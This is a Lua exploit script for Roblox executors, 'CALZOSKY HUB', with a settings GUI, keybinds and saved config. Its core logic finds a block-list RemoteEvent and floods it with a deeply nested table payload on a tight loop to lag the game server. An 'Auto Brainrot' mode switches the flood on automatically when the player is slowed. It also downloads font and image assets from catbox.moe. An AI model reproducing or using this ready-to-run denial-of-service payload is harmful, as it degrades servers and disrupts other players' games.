-- CALZOSKY HUB + Auto Brainrot (CLASSIC EDITION)
-- PC + Controller keybind | Customizable | Auto-save | Auto Brainrot Detection
-- Font: Starborn (solo aplicada al GUI del script)

local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")
local HttpService      = game:GetService("HttpService")
local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")

local plr              = Players.LocalPlayer
local plrGui           = plr:WaitForChild("PlayerGui")

local laggerEnabled     = false
local listeningFor      = nil
local remote            = nil
local brainrotMode      = false
local lastBrainrotState = nil
local loopTask          = nil
local settingsOpen      = false

-- ══════════════════════════════════════════════════════════════════════
-- FUENTE STARBORN + IMAGEN DE FONDO
-- ══════════════════════════════════════════════════════════════════════
local STARBORN_FONT = nil
local BACKGROUND_IMG = nil

do
    if not isfile("starborn.ttf") then
        local ok, data = pcall(game.HttpGet, game, "https://files.catbox.moe/pwgdui.ttf")
        if ok and data and #data > 1000 then
            pcall(writefile, "starborn.ttf", data)
        end
    end

    if isfile("starborn.ttf") then
        if not isfile("starborn.json") then
            pcall(writefile, "starborn.json", HttpService:JSONEncode({
                name = "Starborn",
                faces = {{
                    name    = "Regular",
                    weight  = 400,
                    style   = "normal",
                    assetId = getcustomasset("starborn.ttf"),
                }}
            }))
        end
        local ok, f = pcall(function()
            return Font.new(getcustomasset("starborn.json"))
        end)
        if ok then STARBORN_FONT = f end
    end

    if isfile("calzoskybg.jpg") then
        pcall(delfile, "calzoskybg.jpg")
    end

    local ok, data = pcall(game.HttpGet, game, "https://files.catbox.moe/mywyp2.jpg")
    if ok and data and #data > 1000 then
        pcall(writefile, "calzoskybg.jpg", data)
    end

    if isfile("calzoskybg.jpg") then
        local ok2, asset = pcall(function()
            return getcustomasset("calzoskybg.jpg")
        end)
        if ok2 then BACKGROUND_IMG = asset end
    end
end

local function applyFont(textObj)
    if STARBORN_FONT then
        pcall(function() textObj.FontFace = STARBORN_FONT end)
    end
    return textObj
end

-- ══════════════════════════════════════════════════════════════════════
-- LIMPIAR GUI ANTERIOR
-- ══════════════════════════════════════════════════════════════════════
for _, kid in pairs(plrGui:GetChildren()) do
    if kid.Name == "CalzoskyHubGui" or kid.Name == "GalaxyLaggerGui" or kid.Name == "SharkLaggerGui" then kid:Destroy() end
end

local screen = Instance.new("ScreenGui")
screen.Name         = "CalzoskyHubGui"
screen.ResetOnSpawn = false
screen.DisplayOrder = 15
screen.Parent       = plrGui

-- ══════════════════════════════════════════════════════════════════════
-- CONFIG
-- ══════════════════════════════════════════════════════════════════════
local CONFIG_FILE = "CalzoskyHub_Config.json"

local DEFAULT_CFG = {
    power         = 100000,
    interval      = 0.125,
    keybindKb     = "F",
    keybindGp     = "ButtonR2",
    autoBrainrot  = true,
}

local cfg = {
    power         = DEFAULT_CFG.power,
    interval      = DEFAULT_CFG.interval,
    keybindKb     = DEFAULT_CFG.keybindKb,
    keybindGp     = DEFAULT_CFG.keybindGp,
    autoBrainrot  = DEFAULT_CFG.autoBrainrot,
}

local function resolveKb(name)
    if not name or name == "" or name == "None" then return nil end
    local ok, val = pcall(function() return Enum.KeyCode[name] end)
    return (ok and val) or nil
end

local function saveConfig()
    local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
    if ok and encoded and writefile then pcall(writefile, CONFIG_FILE, encoded) end
end

local function loadConfig()
    if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
    if not ok or type(data) ~= "table" then return end
    cfg.power         = tonumber(data.power) or DEFAULT_CFG.power
    cfg.interval      = tonumber(data.interval) or DEFAULT_CFG.interval
    cfg.keybindKb     = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CFG.keybindKb
    cfg.keybindGp     = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CFG.keybindGp
    cfg.autoBrainrot  = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or DEFAULT_CFG.autoBrainrot
end

loadConfig()

-- ══════════════════════════════════════════════════════════════════════
-- COLORES
-- ══════════════════════════════════════════════════════════════════════
local C = {
    bg      = Color3.fromRGB(35, 35, 35),
    panel   = Color3.fromRGB(45, 45, 45),
    card    = Color3.fromRGB(55, 55, 55),
    accent  = Color3.fromRGB(75, 75, 75),
    accent2 = Color3.fromRGB(95, 95, 95),
    header  = Color3.fromRGB(60, 60, 60),
    white   = Color3.fromRGB(240, 240, 240),
    dim     = Color3.fromRGB(150, 150, 150),
    green   = Color3.fromRGB(70, 190, 100),
    red     = Color3.fromRGB(210, 65, 65),
    waiting = Color3.fromRGB(255, 180, 50),
    inputBg = Color3.fromRGB(25, 25, 25),
    border  = Color3.fromRGB(90, 90, 90),
}

local function tw(obj, props, t)
    TweenService:Create(obj, TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
end

local function makeDraggable(frame)
    local dragging, dragStart, startPos
    frame.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            dragging  = true
            dragStart = i.Position
            startPos  = frame.Position
            i.Changed:Connect(function()
                if i.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    frame.InputChanged:Connect(function(i)
        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
            local d = i.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
        end
    end)
end

local function isGamepad(kc)
    local n = kc.Name
    return n:sub(1,6)=="Button" or n:sub(1,10)=="Thumbstick" or n:sub(1,4)=="DPad" or n=="ButtonSelect" or n=="ButtonStart"
end

local BLACKLISTED = {
    [Enum.KeyCode.Escape]      = true,
    [Enum.KeyCode.LeftControl] = true,
    [Enum.KeyCode.Unknown]     = true,
}

-- ══════════════════════════════════════════════════════════════════════
-- VENTANA PRINCIPAL
-- ══════════════════════════════════════════════════════════════════════
local MAIN_W = 200
local HEADER_H = 28
local BTN_H = 32
local PADDING = 8

local COLLAPSED_H = HEADER_H + BTN_H + (PADDING * 2)
local SETTINGS_PANEL_H = 254

local mainFrame = Instance.new("Frame")
mainFrame.Name             = "MainFrame"
mainFrame.Size             = UDim2.new(0, MAIN_W, 0, COLLAPSED_H)
mainFrame.Position         = UDim2.new(0.5, -MAIN_W/2, 0.5, -COLLAPSED_H/2)
mainFrame.BackgroundColor3 = C.bg
mainFrame.BackgroundTransparency = 0.4
mainFrame.BorderSizePixel  = 0
mainFrame.Active           = true
mainFrame.ClipsDescendants = true
mainFrame.Parent           = screen

local mainStroke = Instance.new("UIStroke", mainFrame)
mainStroke.Color = C.border
mainStroke.Thickness = 1
mainStroke.Transparency = 0.3

-- ══════════════════════════════════════════════════════════════════════
-- IMAGEN DE FONDO
-- ══════════════════════════════════════════════════════════════════════
if BACKGROUND_IMG then
    local bgImage = Instance.new("ImageLabel", mainFrame)
    bgImage.Name              = "BackgroundImage"
    bgImage.Size              = UDim2.new(1, 0, 1, 0)
    bgImage.Position          = UDim2.new(0, 0, 0, 0)
    bgImage.BackgroundTransparency = 1
    bgImage.Image             = BACKGROUND_IMG
    bgImage.ScaleType         = Enum.ScaleType.Crop
    bgImage.ZIndex            = 1

    local bgOverlay = Instance.new("Frame", mainFrame)
    bgOverlay.Name             = "BackgroundOverlay"
    bgOverlay.Size             = UDim2.new(1, 0, 1, 0)
    bgOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    bgOverlay.BackgroundTransparency = 0.85
    bgOverlay.BorderSizePixel  = 0
    bgOverlay.ZIndex           = 2
end

makeDraggable(mainFrame)

-- Header
local header = Instance.new("Frame", mainFrame)
header.Size             = UDim2.new(1,0,0,HEADER_H)
header.BackgroundColor3 = C.header
header.BackgroundTransparency = 0.7
header.BorderSizePixel  = 0
header.ZIndex           = 3

local titleLbl = Instance.new("TextLabel", header)
titleLbl.Size               = UDim2.new(1,-110,1,0)
titleLbl.Position           = UDim2.new(0,8,0,0)
titleLbl.BackgroundTransparency = 1
titleLbl.Text               = "CALZOSKY HUB"
titleLbl.TextColor3         = C.white
titleLbl.TextSize           = 10
titleLbl.TextXAlignment     = Enum.TextXAlignment.Left
titleLbl.ZIndex             = 4
applyFont(titleLbl)

local statusPill = Instance.new("Frame", header)
statusPill.Size             = UDim2.new(0,36,0,16)
statusPill.Position         = UDim2.new(1,-82,0.5,-8)
statusPill.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
statusPill.BackgroundTransparency = 0.4
statusPill.BorderSizePixel  = 0
statusPill.ZIndex           = 4
local statusPillStroke = Instance.new("UIStroke", statusPill)
statusPillStroke.Color = C.border
statusPillStroke.Thickness = 1
statusPillStroke.Transparency = 0.4

local statusLbl = Instance.new("TextLabel", statusPill)
statusLbl.Size              = UDim2.new(1,0,1,0)
statusLbl.BackgroundTransparency = 1
statusLbl.Text              = "OFF"
statusLbl.TextColor3        = C.red
statusLbl.TextSize          = 9
statusLbl.ZIndex            = 5
applyFont(statusLbl)

local settingsBtn = Instance.new("TextButton", header)
settingsBtn.Size             = UDim2.new(0,22,0,22)
settingsBtn.Position         = UDim2.new(1,-42,0.5,-11)
settingsBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
settingsBtn.BackgroundTransparency = 0.4
settingsBtn.BorderSizePixel  = 0
settingsBtn.AutoButtonColor  = false
settingsBtn.Text             = "▼"
settingsBtn.TextColor3       = C.white
settingsBtn.TextSize         = 10
settingsBtn.ZIndex           = 6
local setBtnStroke = Instance.new("UIStroke", settingsBtn)
setBtnStroke.Color = C.border
setBtnStroke.Thickness = 1
setBtnStroke.Transparency = 0.4
applyFont(settingsBtn)

settingsBtn.MouseEnter:Connect(function() tw(settingsBtn,{BackgroundColor3=C.accent},0.1) end)
settingsBtn.MouseLeave:Connect(function() 
    if not settingsOpen then tw(settingsBtn,{BackgroundColor3=Color3.fromRGB(45, 45, 45)},0.1) end
end)

-- ══════════════════════════════════════════════════════════════════════
-- BOTÓN GRANDE ON/OFF (con borde bien visible)
-- ══════════════════════════════════════════════════════════════════════
local activateBtn = Instance.new("TextButton", mainFrame)
activateBtn.Size             = UDim2.new(1,-16,0,BTN_H)
activateBtn.Position         = UDim2.new(0,8,0,HEADER_H + PADDING)
activateBtn.BackgroundColor3 = C.card
activateBtn.BackgroundTransparency = 0.5
activateBtn.BorderSizePixel  = 0
activateBtn.AutoButtonColor  = false
activateBtn.Text             = ""
activateBtn.ZIndex           = 4

-- 🔹 BORDE DEL BOTÓN GRANDE (grueso y bien visible)
local activateStroke = Instance.new("UIStroke", activateBtn)
activateStroke.Color        = Color3.fromRGB(220, 80, 80)   -- rojo cuando OFF
activateStroke.Thickness    = 3
activateStroke.Transparency = 0

local activateLbl = Instance.new("TextLabel", activateBtn)
activateLbl.Size            = UDim2.new(1,0,1,0)
activateLbl.BackgroundTransparency = 1
activateLbl.Text            = "OFF"
activateLbl.TextColor3      = C.white
activateLbl.TextSize        = 11
activateLbl.ZIndex          = 5
applyFont(activateLbl)

-- ══════════════════════════════════════════════════════════════════════
-- PANEL DE AJUSTES
-- ══════════════════════════════════════════════════════════════════════
local SETTINGS_Y = HEADER_H + BTN_H + (PADDING * 2)

local settingsContainer = Instance.new("Frame", mainFrame)
settingsContainer.Name             = "SettingsContainer"
settingsContainer.Size             = UDim2.new(1, 0, 0, SETTINGS_PANEL_H)
settingsContainer.Position         = UDim2.new(0, 0, 0, SETTINGS_Y)
settingsContainer.BackgroundColor3 = C.panel
settingsContainer.BackgroundTransparency = 0.5
settingsContainer.BorderSizePixel  = 0
settingsContainer.ZIndex           = 4
settingsContainer.ClipsDescendants = true
settingsContainer.Visible          = false

local function makeRow(yPos, h)
    local row = Instance.new("Frame", settingsContainer)
    row.Size             = UDim2.new(1,-8,0,h)
    row.Position         = UDim2.new(0,4,0,yPos)
    row.BackgroundColor3 = C.card
    row.BackgroundTransparency = 0.55
    row.BorderSizePixel  = 0
    row.ZIndex           = 5
    local rs = Instance.new("UIStroke", row)
    rs.Color = C.border
    rs.Thickness = 1
    rs.Transparency = 0.4
    return row
end

local function makeLabel(parent, text, xPos, xSize)
    local lbl = Instance.new("TextLabel", parent)
    lbl.Size               = UDim2.new(xSize,0,1,0)
    lbl.Position           = UDim2.new(0,xPos,0,0)
    lbl.BackgroundTransparency = 1
    lbl.Text               = text
    lbl.TextColor3         = C.white
    lbl.TextSize           = 10
    lbl.TextXAlignment     = Enum.TextXAlignment.Left
    lbl.ZIndex             = 6
    applyFont(lbl)
    return lbl
end

local function mkInputRow(yPos, labelText, getValue, onConfirm)
    local row = makeRow(yPos, 28)
    makeLabel(row, labelText, 8, 0.5)

    local box = Instance.new("TextBox", row)
    box.Size               = UDim2.new(0,58,0,20)
    box.Position           = UDim2.new(1,-66,0.5,-10)
    box.BackgroundColor3   = C.inputBg
    box.BackgroundTransparency = 0.3
    box.BorderSizePixel    = 0
    box.Text               = tostring(getValue())
    box.TextColor3         = C.white
    box.TextSize           = 10
    box.ClearTextOnFocus   = false
    box.ZIndex             = 7
    applyFont(box)
    local bs = Instance.new("UIStroke",box); bs.Color=C.border; bs.Thickness=1; bs.Transparency=0.4

    box.Focused:Connect(function() tw(bs,{Color=C.white,Transparency=0},0.12) end)
    box.FocusLost:Connect(function()
        tw(bs,{Color=C.border,Transparency=0.4},0.12)
        local n = tonumber(box.Text)
        if n then
            onConfirm(n)
            box.Text = tostring(getValue())
            saveConfig()
        else
            box.Text = tostring(getValue())
        end
    end)
    return box
end

local kbBindBtn, gpBindBtn

local function updateKbLabels()
    if kbBindBtn then
        if listeningFor == "kb" then
            kbBindBtn.Text = "..."; kbBindBtn.TextColor3 = C.waiting
        else
            kbBindBtn.Text = cfg.keybindKb ~= "" and cfg.keybindKb or "None"; kbBindBtn.TextColor3 = C.white
        end
    end
    if gpBindBtn then
        if listeningFor == "gp" then
            gpBindBtn.Text = "..."; gpBindBtn.TextColor3 = C.waiting
        else
            gpBindBtn.Text = cfg.keybindGp ~= "" and cfg.keybindGp or "None"; gpBindBtn.TextColor3 = C.white
        end
    end
end

local function mkKeybindRow(yPos, labelText, which)
    local row = makeRow(yPos, 28)
    makeLabel(row, labelText, 8, 0.45)

    local bindBtn = Instance.new("TextButton", row)
    bindBtn.Size             = UDim2.new(0,62,0,20)
    bindBtn.Position         = UDim2.new(1,-88,0.5,-10)
    bindBtn.BackgroundColor3 = C.inputBg
    bindBtn.BackgroundTransparency = 0.3
    bindBtn.BorderSizePixel  = 0
    bindBtn.AutoButtonColor  = false
    bindBtn.TextSize         = 9
    bindBtn.TextColor3       = C.white
    bindBtn.ZIndex           = 7
    bindBtn.Text             = which == "kb" and cfg.keybindKb or cfg.keybindGp
    applyFont(bindBtn)
    local bStr = Instance.new("UIStroke",bindBtn); bStr.Color=C.border; bStr.Thickness=1; bStr.Transparency=0.4
    bindBtn.MouseEnter:Connect(function() tw(bStr,{Color=C.white,Transparency=0},0.1) end)
    bindBtn.MouseLeave:Connect(function() tw(bStr,{Color=C.border,Transparency=0.4},0.1) end)

    bindBtn.MouseButton1Click:Connect(function()
        listeningFor = (listeningFor == which) and nil or which
        updateKbLabels()
    end)

    local clearBtn = Instance.new("TextButton", row)
    clearBtn.Size             = UDim2.new(0,22,0,20)
    clearBtn.Position         = UDim2.new(1,-24,0.5,-10)
    clearBtn.BackgroundColor3 = Color3.fromRGB(60,30,30)
    clearBtn.BackgroundTransparency = 0.3
    clearBtn.BorderSizePixel  = 0
    clearBtn.AutoButtonColor  = false
    clearBtn.Text             = "X"
    clearBtn.TextColor3       = C.red
    clearBtn.TextSize         = 10
    clearBtn.ZIndex           = 7
    applyFont(clearBtn)
    local cStr = Instance.new("UIStroke",clearBtn); cStr.Color=C.red; cStr.Thickness=1; cStr.Transparency=0.5
    clearBtn.MouseEnter:Connect(function() tw(cStr,{Transparency=0},0.1) end)
    clearBtn.MouseLeave:Connect(function() tw(cStr,{Transparency=0.5},0.1) end)

    clearBtn.MouseButton1Click:Connect(function()
        if listeningFor == which then listeningFor = nil end
        if which == "kb" then cfg.keybindKb = "None" else cfg.keybindGp = "None" end
        updateKbLabels(); saveConfig()
    end)

    if which == "kb" then kbBindBtn = bindBtn end
    if which == "gp" then gpBindBtn = bindBtn end
end

local autoBrainrotBtn
local function createBrainrotRow(yPos)
    local row = makeRow(yPos, 28)
    makeLabel(row, "Auto Brainrot", 8, 0.6)

    local toggleBtn = Instance.new("TextButton", row)
    toggleBtn.Size             = UDim2.new(0,48,0,20)
    toggleBtn.Position         = UDim2.new(1,-56,0.5,-10)
    toggleBtn.BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(60,20,20)
    toggleBtn.BackgroundTransparency = 0.3
    toggleBtn.BorderSizePixel  = 0
    toggleBtn.AutoButtonColor  = false
    toggleBtn.Text             = cfg.autoBrainrot and "ON" or "OFF"
    toggleBtn.TextColor3       = C.white
    toggleBtn.TextSize         = 9
    toggleBtn.ZIndex           = 7
    applyFont(toggleBtn)
    local tStr = Instance.new("UIStroke", toggleBtn)
    tStr.Color = C.border; tStr.Thickness = 1; tStr.Transparency = 0.4

    toggleBtn.MouseButton1Click:Connect(function()
        cfg.autoBrainrot = not cfg.autoBrainrot
        toggleBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
        tw(toggleBtn, {BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(60,20,20)}, 0.15)
        saveConfig()
    end)
    autoBrainrotBtn = toggleBtn
end

-- ══════════════════════════════════════════════════════════════════════
-- CONSTRUIR CONTENIDO
-- ══════════════════════════════════════════════════════════════════════
local Y = 6
local GAP = 4
local ROW_H = 28

local powerBox = mkInputRow(Y, "Power", function() return cfg.power end, function(v) cfg.power = math.clamp(v, 25000, 250000) end)
Y = Y + ROW_H + GAP

local intervalBox = mkInputRow(Y, "Delay", function() return cfg.interval end, function(v) cfg.interval = math.clamp(v, 0.001, 3) end)
Y = Y + ROW_H + GAP

createBrainrotRow(Y)
Y = Y + ROW_H + GAP + 4

local div = Instance.new("Frame", settingsContainer)
div.Size = UDim2.new(1,-8,0,1); div.Position = UDim2.new(0,4,0,Y)
div.BackgroundColor3 = C.border; div.BorderSizePixel = 0; div.ZIndex = 5
div.BackgroundTransparency = 0.4
Y = Y + 8

local kbSectLbl = Instance.new("TextLabel", settingsContainer)
kbSectLbl.Size = UDim2.new(1,-8,0,14); kbSectLbl.Position = UDim2.new(0,8,0,Y)
kbSectLbl.BackgroundTransparency = 1; kbSectLbl.Text = "KEYBINDS"
kbSectLbl.TextColor3 = C.dim
kbSectLbl.TextSize = 9; kbSectLbl.TextXAlignment = Enum.TextXAlignment.Left; kbSectLbl.ZIndex = 6
applyFont(kbSectLbl)
Y = Y + 16

mkKeybindRow(Y, "Keyboard", "kb"); Y = Y + ROW_H + GAP
mkKeybindRow(Y, "Controller", "gp"); Y = Y + ROW_H + GAP + 4

local resetBtn = Instance.new("TextButton", settingsContainer)
resetBtn.Size = UDim2.new(1,-8,0,24); resetBtn.Position = UDim2.new(0,4,0,Y)
resetBtn.BackgroundColor3 = C.accent
resetBtn.BackgroundTransparency = 0.3
resetBtn.BorderSizePixel = 0
resetBtn.AutoButtonColor = false; resetBtn.Text = "Reset Defaults"
resetBtn.TextColor3 = C.white; resetBtn.TextSize = 10; resetBtn.ZIndex = 6
applyFont(resetBtn)
local rStr = Instance.new("UIStroke", resetBtn); rStr.Color = C.border; rStr.Thickness = 1; rStr.Transparency = 0.4
resetBtn.MouseEnter:Connect(function() tw(resetBtn,{BackgroundColor3=C.accent2},0.1) end)
resetBtn.MouseLeave:Connect(function() tw(resetBtn,{BackgroundColor3=C.accent},0.1) end)

-- ══════════════════════════════════════════════════════════════════════
-- DIALOGO DE CONFIRMACIÓN
-- ══════════════════════════════════════════════════════════════════════
local confirmBackdrop = Instance.new("Frame")
confirmBackdrop.Size = UDim2.new(1,0,1,0); confirmBackdrop.BackgroundColor3 = Color3.fromRGB(0,0,0)
confirmBackdrop.BackgroundTransparency = 0.5; confirmBackdrop.BorderSizePixel = 0
confirmBackdrop.Visible = false; confirmBackdrop.ZIndex = 50; confirmBackdrop.Parent = screen

local confirmBox = Instance.new("Frame", confirmBackdrop)
confirmBox.Size = UDim2.new(0,200,0,110); confirmBox.Position = UDim2.new(0.5,-100,0.5,-55)
confirmBox.BackgroundColor3 = C.panel; confirmBox.BackgroundTransparency = 0.3; confirmBox.BorderSizePixel = 0; confirmBox.ZIndex = 51
Instance.new("UIStroke", confirmBox).Color = C.border

local confirmLbl = Instance.new("TextLabel", confirmBox)
confirmLbl.Size = UDim2.new(1,-16,0,54); confirmLbl.Position = UDim2.new(0,8,0,8)
confirmLbl.BackgroundTransparency = 1; confirmLbl.Text = "Reset all settings to defaults?"
confirmLbl.TextWrapped = true; confirmLbl.TextColor3 = C.white
confirmLbl.TextSize = 11; confirmLbl.ZIndex = 52
applyFont(confirmLbl)

local confirmYes = Instance.new("TextButton", confirmBox)
confirmYes.Size = UDim2.new(0,88,0,28); confirmYes.Position = UDim2.new(0,8,1,-36)
confirmYes.BackgroundColor3 = C.accent; confirmYes.BackgroundTransparency = 0.3; confirmYes.BorderSizePixel = 0
confirmYes.AutoButtonColor = false; confirmYes.Text = "Confirm"
confirmYes.TextColor3 = C.white; confirmYes.TextSize = 11; confirmYes.ZIndex = 52
applyFont(confirmYes)
Instance.new("UIStroke", confirmYes).Color = C.border

local confirmNo = Instance.new("TextButton", confirmBox)
confirmNo.Size = UDim2.new(0,88,0,28); confirmNo.Position = UDim2.new(1,-96,1,-36)
confirmNo.BackgroundColor3 = C.card; confirmNo.BackgroundTransparency = 0.3; confirmNo.BorderSizePixel = 0
confirmNo.AutoButtonColor = false; confirmNo.Text = "Cancel"
confirmNo.TextColor3 = C.dim; confirmNo.TextSize = 11; confirmNo.ZIndex = 52
applyFont(confirmNo)
Instance.new("UIStroke", confirmNo).Color = C.border

confirmYes.MouseEnter:Connect(function() tw(confirmYes,{BackgroundColor3=C.accent2},0.1) end)
confirmYes.MouseLeave:Connect(function() tw(confirmYes,{BackgroundColor3=C.accent},0.1) end)
confirmNo.MouseEnter:Connect(function() tw(confirmNo,{TextColor3=C.white},0.1) end)
confirmNo.MouseLeave:Connect(function() tw(confirmNo,{TextColor3=C.dim},0.1) end)

local function hideConfirm() confirmBackdrop.Visible = false end
confirmNo.MouseButton1Click:Connect(hideConfirm)

confirmYes.MouseButton1Click:Connect(function()
    cfg.power = DEFAULT_CFG.power; cfg.interval = DEFAULT_CFG.interval
    cfg.keybindKb = DEFAULT_CFG.keybindKb; cfg.keybindGp = DEFAULT_CFG.keybindGp
    cfg.autoBrainrot = DEFAULT_CFG.autoBrainrot
    powerBox.Text = tostring(cfg.power); intervalBox.Text = tostring(cfg.interval)
    updateKbLabels()
    if autoBrainrotBtn then
        autoBrainrotBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
        tw(autoBrainrotBtn, {BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(60,20,20)}, 0.15)
    end
    saveConfig(); hideConfirm()
end)

resetBtn.MouseButton1Click:Connect(function()
    confirmLbl.Text = "Reset all settings to defaults?"
    confirmBackdrop.Visible = true
end)

-- ══════════════════════════════════════════════════════════════════════
-- ABRIR / CERRAR AJUSTES
-- ══════════════════════════════════════════════════════════════════════
local function openSettings()
    settingsOpen = true
    settingsContainer.Visible = true
    settingsContainer.Size = UDim2.new(1, 0, 0, 0)
    tw(settingsContainer, {Size = UDim2.new(1, 0, 0, SETTINGS_PANEL_H)}, 0.2)
    tw(mainFrame, {Size = UDim2.new(0, MAIN_W, 0, COLLAPSED_H + SETTINGS_PANEL_H)}, 0.2)
    tw(settingsBtn, {BackgroundColor3=C.accent}, 0.12)
    settingsBtn.Text = "▲"
    
    powerBox.Text = tostring(cfg.power); intervalBox.Text = tostring(cfg.interval)
    updateKbLabels()
    if autoBrainrotBtn then
        autoBrainrotBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
        autoBrainrotBtn.BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(60,20,20)
    end
end

local function closeSettings()
    settingsOpen = false; listeningFor = nil; updateKbLabels()
    tw(settingsContainer, {Size = UDim2.new(1, 0, 0, 0)}, 0.16)
    task.delay(0.18, function() settingsContainer.Visible = false end)
    tw(mainFrame, {Size = UDim2.new(0, MAIN_W, 0, COLLAPSED_H)}, 0.2)
    tw(settingsBtn, {BackgroundColor3=Color3.fromRGB(45, 45, 45)}, 0.12)
    settingsBtn.Text = "▼"
    hideConfirm()
end

settingsBtn.MouseButton1Click:Connect(function()
    if settingsOpen then closeSettings() else openSettings() end
end)

-- ══════════════════════════════════════════════════════════════════════
-- LÓGICA DEL PING LAGGER
-- ══════════════════════════════════════════════════════════════════════
local function findRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local rem
    for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
        local r = rrs:FindFirstChild(name)
        if r and r:IsA("RemoteEvent") then rem = r break end
    end
    if not rem then
        for _, c in ipairs(rrs:GetChildren()) do
            if c:IsA("RemoteEvent") and c.Name:find("Block") then rem = c break end
        end
    end
    return rem
end

remote = findRemote()

local function buildPayload(power)
    local main = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, 186 do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.min(math.floor(power / 188), 10000)
    for _ = 1, maxRep do table.insert(main, nested) end
    return main
end

local function toggleLagger(state)
    laggerEnabled = state
    if laggerEnabled then
        if not remote then
            remote = findRemote()
            if not remote then laggerEnabled = false; toggleLagger(false); return end
        end

        activateBtn.BackgroundColor3 = C.green
        activateBtn.BackgroundTransparency = 0.3
        activateLbl.Text = "ON"
        -- 🔹 BORDE VERDE CLARO cuando ON
        activateStroke.Color = Color3.fromRGB(150, 255, 180)
        activateStroke.Thickness = 3
        activateStroke.Transparency = 0

        statusLbl.Text = "ON"; statusLbl.TextColor3 = C.green
        statusPill.BackgroundColor3 = Color3.fromRGB(20, 50, 30)
        statusPill.BackgroundTransparency = 0.3
        mainStroke.Color = C.green

        local payload = buildPayload(cfg.power)
        if loopTask then task.cancel(loopTask) end
        loopTask = task.spawn(function()
            local currentDelay = cfg.interval
            while laggerEnabled do
                local ok = pcall(function() remote:FireServer(payload) end)
                if not ok then currentDelay = math.min(currentDelay * 1.5, 0.5)
                else currentDelay = math.max(currentDelay * 0.995, 0.05) end
                task.wait(currentDelay)
            end
        end)
    else
        activateBtn.BackgroundColor3 = C.card
        activateBtn.BackgroundTransparency = 0.5
        activateLbl.Text = "OFF"
        -- 🔹 BORDE ROJO cuando OFF
        activateStroke.Color = Color3.fromRGB(220, 80, 80)
        activateStroke.Thickness = 3
        activateStroke.Transparency = 0

        statusLbl.Text = "OFF"; statusLbl.TextColor3 = C.red
        statusPill.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        statusPill.BackgroundTransparency = 0.4
        mainStroke.Color = C.border
        if loopTask then task.cancel(loopTask); loopTask = nil end
    end
end

activateBtn.MouseButton1Click:Connect(function() toggleLagger(not laggerEnabled) end)
activateBtn.MouseEnter:Connect(function() if not laggerEnabled then tw(activateBtn, {BackgroundColor3 = C.accent}, 0.1) end end)
activateBtn.MouseLeave:Connect(function() if not laggerEnabled then tw(activateBtn, {BackgroundColor3 = C.card}, 0.1) end end)

-- ══════════════════════════════════════════════════════════════════════
-- AUTO BRAINROT
-- ══════════════════════════════════════════════════════════════════════
RunService.Heartbeat:Connect(function()
    if not cfg.autoBrainrot then
        if brainrotMode then brainrotMode = false; lastBrainrotState = false end
        return
    end
    local char = plr.Character
    if not char then return end
    local hum = char:FindFirstChild("Humanoid")
    if not hum then return end

    local hasBrainrot = hum.WalkSpeed < 25
    if lastBrainrotState == nil then lastBrainrotState = hasBrainrot; brainrotMode = hasBrainrot; return end

    if hasBrainrot and not lastBrainrotState then
        brainrotMode = true; lastBrainrotState = true; toggleLagger(true)
    elseif not hasBrainrot and lastBrainrotState then
        brainrotMode = false; lastBrainrotState = false; toggleLagger(false)
    end
end)

-- ══════════════════════════════════════════════════════════════════════
-- INPUT HANDLER
-- ══════════════════════════════════════════════════════════════════════
UserInputService.InputBegan:Connect(function(input, processed)
    local kc = input.KeyCode
    if kc == Enum.KeyCode.Unknown then return end

    local isGp = isGamepad(kc)
    local isKb = input.UserInputType == Enum.UserInputType.Keyboard

    if listeningFor then
        if kc == Enum.KeyCode.Escape then listeningFor = nil; updateKbLabels(); return end
        if listeningFor == "kb" and isKb and not BLACKLISTED[kc] then
            cfg.keybindKb = kc.Name; listeningFor = nil; updateKbLabels(); saveConfig(); return
        end
        if listeningFor == "gp" and isGp then
            cfg.keybindGp = kc.Name; listeningFor = nil; updateKbLabels(); saveConfig(); return
        end
        return
    end

    if processed then return end

    if kc == Enum.KeyCode.LeftControl then
        mainFrame.Visible = not mainFrame.Visible
        if not mainFrame.Visible and settingsOpen then closeSettings() end
        return
    end

    local kbEnum = resolveKb(cfg.keybindKb)
    local gpEnum = resolveKb(cfg.keybindGp)
    if (kbEnum and kc == kbEnum and isKb) or (gpEnum and kc == gpEnum and isGp) then
        toggleLagger(not laggerEnabled)
    end
end)

updateKbLabels()

task.spawn(function()
    while true do task.wait(5); saveConfig() end
end)